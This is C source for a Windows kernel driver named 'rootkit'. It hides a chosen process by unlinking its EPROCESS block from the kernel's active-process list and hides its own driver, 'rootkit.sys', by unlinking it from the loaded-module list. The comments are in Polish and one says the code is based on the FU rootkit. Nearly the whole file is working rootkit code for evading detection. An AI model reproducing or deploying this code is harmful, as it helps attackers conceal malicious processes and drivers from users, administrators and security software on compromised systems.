
#include <ntddk.h>
#include "rootkit.h"
#include "rk_DKOM.h"
#include "rk_Tools.h"

extern PMODULE_ENTRY	g_ModuleListBegin;
extern NTOSKRNL_OFFSETS offsets;

BOOLEAN OnProcessHide(IN ULONG pid) 
{
	PEPROCESS eproc = 0;
	KIRQL tmpIrql;

	DbgPrint("rootkit: PID to hide: %ld\n",pid);

	tmpIrql = RaiseIRQLevel();

	eproc = (PEPROCESS)FindProcessEPROCByPid( pid );

	if (eproc == NULL ) {
		DbgPrint("rootkit: Nie moge znalezc bloku EPROCESS\n");	 
  	    LowerIRQLevel( tmpIrql );
		return FALSE;
	}
	
	DKOM_HideProcess( eproc );
	
	LowerIRQLevel( tmpIrql );


	return TRUE;
}


ULONG FindProcessEPROCByPid(int terminate_PID)
{
	ULONG eproc       = 0x00000000; 
	int   current_PID = 0;
	int   start_PID   = 0; 
	int   i_count     = 0;
	PLIST_ENTRY plist_active_procs;

	if (terminate_PID == 0)
		return terminate_PID;

	eproc = (ULONG) PsGetCurrentProcess();
	start_PID = *((ULONG*)(eproc+offsets.processPid));
	current_PID = start_PID;

	while(1)
	{
		if(terminate_PID == current_PID)
			return eproc;
		else if((i_count >= 1) && (start_PID == current_PID))
		{
			return 0x00000000;
		}
		else {
			plist_active_procs = (LIST_ENTRY *) (eproc+offsets.activeProcessListOffset);
			eproc = (ULONG) plist_active_procs->Flink;
			eproc = eproc - offsets.activeProcessListOffset;
			current_PID = *((int *)(eproc+offsets.processPid));
			i_count++;
		}
	}
}

ULONG FindProcessEPROCByName(char procName[])
{
	ULONG eproc       = 0x00000000; 
	int	i_count     = 0;
	char *startName = 0;
	char *currentName = 0;
	PLIST_ENTRY plist_active_procs;

	if (procName == 0)
		return 0;

	_asm int 3

	eproc = (ULONG)PsGetCurrentProcess();
	startName = (PCHAR)(eproc+offsets.processName);
	currentName = startName;

	while(1)
	{

		if (!strncmp( procName, currentName, strlen(procName) ) ) 
			return eproc;
		else 
		if((i_count >= 1) && (startName == currentName))
		{
			return 0x00000000;
		}
		else {
			plist_active_procs = (LIST_ENTRY *) (eproc+offsets.activeProcessListOffset);
			eproc = (ULONG) plist_active_procs->Flink;
			eproc = eproc - offsets.activeProcessListOffset;
			currentName = (PCHAR)(eproc+offsets.processName);
			i_count++;
		}
	}
}

// kod bazuje na FU rootkit
VOID DKOM_HideProcess( PEPROCESS eproces )
{
	PLIST_ENTRY plist_active_procs;
	plist_active_procs = (PLIST_ENTRY)((ULONG)eproces + offsets.activeProcessListOffset);

	*( (ULONG*)plist_active_procs->Blink )  = (ULONG)plist_active_procs->Flink;
	*( (ULONG*)plist_active_procs->Flink+1) = (ULONG)plist_active_procs->Blink;
	
	plist_active_procs->Flink = (LIST_ENTRY*)&(plist_active_procs->Flink);
	plist_active_procs->Blink = (LIST_ENTRY*)&(plist_active_procs->Flink);
}

BOOLEAN HideRootkitModule() 
{
	UNICODE_STRING rootkitdriver;
	PMODULE_ENTRY pHelper;	
    BOOLEAN	 bFound;

//	tmpIrql = RaiseIRQLevel();

    bFound = FALSE;

	RtlInitUnicodeString( &rootkitdriver, L"rootkit.sys" );

	DbgPrint("rootkit: Chowam driver: %S\n",rootkitdriver.Buffer);

//	DbgPrint("g_PsLoadedModuleList: %x\n",g_PsLoadedModuleList);

	pHelper = g_ModuleListBegin;

	while ((PMODULE_ENTRY)pHelper->le_mod.Flink != g_ModuleListBegin ) {
		if ( (pHelper->unk1 != 0x00000000) && (pHelper->driver_Path.Length!=0)) {
			//porownujemy nazwy driverow
			if (RtlCompareUnicodeString(&rootkitdriver, &(pHelper->driver_Name),FALSE ) == 0 ) {
				//zminieniamy sasiadow
				*((PULONG)pHelper->le_mod.Blink) = (ULONG)pHelper->le_mod.Flink;
				pHelper->le_mod.Flink->Blink = pHelper->le_mod.Blink;
				return TRUE;
			}
		}
		pHelper = (PMODULE_ENTRY)pHelper->le_mod.Flink;
	}

    return FALSE;
}

ULONG GetModuleListBegin (PDRIVER_OBJECT  DriverObject)
{
	PMODULE_ENTRY pHelper;

	pHelper = *((PMODULE_ENTRY*)((ULONG)DriverObject + 0x14));
	if (pHelper == NULL)
		return 0;
	
	return (ULONG) pHelper;
}

PMODULE_ENTRY FindModuleEntry(PMODULE_ENTRY pPsLoadedModuleList, PUNICODE_STRING usModuleName)
{
	PMODULE_ENTRY pMeCurrent = pPsLoadedModuleList;

	while ( (PMODULE_ENTRY)(pMeCurrent->le_mod.Flink) != pPsLoadedModuleList) {
		if ( (pMeCurrent->unk1 !=0x00000000) && pMeCurrent->driver_Path.Length!= 0) {
			if (RtlCompareUnicodeString(usModuleName, &(pMeCurrent->driver_Name),FALSE)== 0) {
				//znaleziono modul
				return pMeCurrent;
			}
		}
		pMeCurrent = (PMODULE_ENTRY)pMeCurrent->le_mod.Flink;
	}

	return NULL;
}
